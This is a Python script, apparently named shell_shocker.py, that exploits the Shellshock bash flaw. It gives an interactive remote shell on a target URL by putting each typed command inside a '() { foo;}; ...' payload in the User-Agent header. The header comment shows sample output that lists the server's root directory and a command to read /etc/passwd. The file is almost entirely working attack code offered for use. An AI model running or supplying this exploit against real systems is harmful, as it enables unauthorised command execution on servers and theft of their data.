#!/usr/bin/python

# Successful Output:
# # python shell_shocker.py <VulnURL>
# [+] Attempting Shell_Shock - Make sure to type full path
# ~$ /bin/ls /
# bin
# boot
# dev
# etc
# ..
# ~$ /bin/cat /etc/passwd

from __future__ import print_function
from future import standard_library
standard_library.install_aliases()
from builtins import input
import sys, urllib.request, urllib.error, urllib.parse

if len(sys.argv) != 2:
        print("Usage: shell_shocker <URL>")
        sys.exit(0)

URL=sys.argv[1]
print("[+] Attempting Shell_Shock - Make sure to type full path")

while True:
        command=input("~$ ")
        opener=urllib.request.build_opener()
        opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]
        try:
                response=opener.open(URL)
                for line in response.readlines():
                        print(line.strip())
        except Exception as e: print(e)
